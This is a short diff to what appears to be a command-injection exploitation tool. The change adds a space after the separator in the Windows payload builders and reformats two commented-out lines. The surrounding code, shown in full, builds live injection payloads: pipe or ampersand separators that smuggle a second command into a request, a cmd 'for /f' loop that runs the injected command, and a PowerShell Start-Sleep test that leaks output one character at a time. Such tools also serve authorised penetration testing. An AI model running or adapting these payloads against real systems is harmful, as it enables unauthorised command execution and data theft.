@@ -206,7 +206,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
   if settings.TARGET_OS == "win":
     if separator == "||" :
       pipe = "|"
-      payload = (pipe +
+      payload = (pipe + " "
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
@@ -228,7 +228,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
         ampersand = "%26"
       else:
         ampersand = "&"
-      payload = (ampersand +
+      payload = (ampersand + " "
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                 cmd + 
                 "\"') do @set /p =%i" +
@@ -581,7 +581,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
-                #"else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
+                # "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
     if separator == "&&" :
@@ -595,7 +595,7 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
                 "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\") "
-                #"else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
+                # "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
   else:  
